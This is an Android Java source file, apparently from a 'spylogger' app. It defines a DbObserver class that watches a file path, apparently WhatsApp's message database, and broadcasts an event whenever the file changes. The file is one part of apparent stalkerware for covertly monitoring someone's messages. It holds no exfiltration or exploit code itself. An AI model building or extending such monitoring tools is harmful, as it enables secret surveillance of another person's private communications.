package com.gravatasufoca.spylogger.observers;

import android.content.Context;
import android.content.Intent;
import android.os.FileObserver;
import android.util.Log;

import com.gravatasufoca.spylogger.utils.Utils;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by bruno on 21/04/17.
 */

public abstract class DbObserver {

    protected Context context;

    public DbObserver(Context context) {
        this.context = context;
    }

    protected static Map<Class,FileObserver> observers=new HashMap<>();

    protected static synchronized void addObserver(Class clazz,FileObserver fileObserver){
        if(!observers.containsKey(clazz)){
            observers.put(clazz,fileObserver);
        }
    }

    public abstract void observe();

    protected void start(final Class clazz, final String path){
        Log.i("SPYLOGGER", "INICIANDO OBSERVER WHATSAPP");
        FileObserver fileObserver;
        if(!observers.containsKey(clazz)) {
            fileObserver = new FileObserver(path) {
                @Override
                public void onEvent(int event, String file) {

                    switch (event) {
                        case FileObserver.MODIFY:
                            Log.d("DEBUG", "MODIFY:" + path + file);
                            sendEvent(clazz);
                            break;
                        default:
                            break;
                    }
                }
            };
            addObserver(clazz,fileObserver);
        }else{
            fileObserver=observers.get(clazz);
        }
        fileObserver.startWatching();
    }

    private void sendEvent(Class clazz) {
        Intent intent = new Intent(Utils.MENSAGEM_RECEBIDA);
        intent.putExtra("classe", clazz.getName());
        context.sendBroadcast(intent);
    }
}
